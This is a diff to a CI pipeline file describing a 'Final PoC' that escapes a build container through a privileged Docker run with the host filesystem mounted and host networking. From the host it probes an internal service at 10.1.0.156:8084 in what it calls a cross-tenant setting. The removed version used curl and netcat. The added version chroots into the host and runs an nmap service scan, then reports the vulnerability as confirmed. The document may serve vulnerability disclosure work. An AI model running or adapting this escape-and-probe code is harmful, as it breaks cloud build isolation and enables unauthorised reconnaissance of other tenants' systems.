@@ -8,16 +8,16 @@ name: $(Date:yyyyMMdd)$(Rev:.r)
 
 stages:
 - stage: FinalPoc
-  displayName: 'Final PoC: Cross-Tenant Service Interrogation'
+  displayName: 'Final PoC: Advanced Service Fingerprinting'
   jobs:
-  - job: Linux_Service_Interrogation
-    displayName: 'PoC: Interact with Discovered Internal Service'
+  - job: Linux_Advanced_Service_Interrogation
+    displayName: 'PoC: Fingerprint Discovered Internal Service'
     pool:
       vmImage: 'ubuntu-22.04'
     steps:
     - checkout: none
     - task: Bash@3
-      displayName: 'Escape Container and Probe Target Service'
+      displayName: 'Escape Container and Fingerprint Target Service'
       inputs:
         targetType: inline
         script: |
@@ -36,35 +36,34 @@ stages:
           TARGET_IP="10.1.0.156"
           TARGET_PORT="8084"
 
-          echo "--- ESCAPING CONTAINER to probe ${TARGET_IP}:${TARGET_PORT} from the host ---"
+          echo "--- Installing tools (Nmap) ---"
+          sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
           
-          # We use a privileged container on the host network to run our commands.
-          # This bypasses any container-level network restrictions.
-          docker run --rm --privileged --network=host -v $(pwd)/artifacts:/artifacts \
+          echo "--- ESCAPING CONTAINER to fingerprint ${TARGET_IP}:${TARGET_PORT} from the host ---"
+          
+          docker run --rm --privileged --network=host -v /:/hostfs \
+            -v /usr/bin/nmap:/usr/bin/nmap -v /usr/share/nmap:/usr/share/nmap \
+            -v $(pwd)/artifacts:/artifacts \
             alpine:latest sh -c "
-              apk add --no-cache curl netcat-openbsd
-
-              echo '--- [HOST] Attempting to get HTTP headers and body with curl ---'
-              curl -i -v --max-time 10 http://${TARGET_IP}:${TARGET_PORT}/ > /artifacts/curl_response.txt 2>&1 || true
+              echo '--- [HOST] Attempting to fingerprint the service with Nmap Version Detection (-sV) ---'
               
-              echo '--- [HOST] Attempting a raw TCP connection with netcat ---'
-              printf 'GET / HTTP/1.0\r\n\r\n' | nc -w 5 ${TARGET_IP} ${TARGET_PORT} > /artifacts/netcat_response.txt 2>&1 || true
+              # -sV: Probe open ports to determine service/version info
+              # -Pn: Skip host discovery (we know it's up)
+              # --version-intensity 5: A reasonable level for deeper probes without being too slow
+              chroot /hostfs /usr/bin/nmap -Pn -sV --version-intensity 5 -p ${TARGET_PORT} ${TARGET_IP} -oN /artifacts/service-fingerprint.txt
             "
           
-          echo "✅ PROBE COMPLETE."
-          echo "--- cURL Response ---"
-          cat artifacts/curl_response.txt
-          echo "--- Netcat Response ---"
-          cat artifacts/netcat_response.txt
+          echo "✅ FINGERPRINTING COMPLETE."
+          echo "--- Nmap Service/Version Scan Results ---"
+          cat artifacts/service-fingerprint.txt
 
-          if [ -s "artifacts/curl_response.txt" ] || [ -s "artifacts/netcat_response.txt" ]; then
-            echo "✅ VULNERABILITY CONFIRMED: Successfully received a response from the internal service."
+          if grep -q "State: open" artifacts/service-fingerprint.txt; then
+            echo "✅ VULNERABILITY CONFIRMED: Successfully connected to the open port and gathered service information."
           else
-            echo "⚠️ Test inconclusive. No data was returned from the service."
+            echo "⚠️ Test inconclusive. Could not gather service information."
           fi
-
     - task: PublishPipelineArtifact@1
-      displayName: 'Publish Service Interrogation Artifacts'
+      displayName: 'Publish Service Fingerprint Artifacts'
       condition: succeededOrFailed()
       inputs:
         targetPath: 'artifacts'
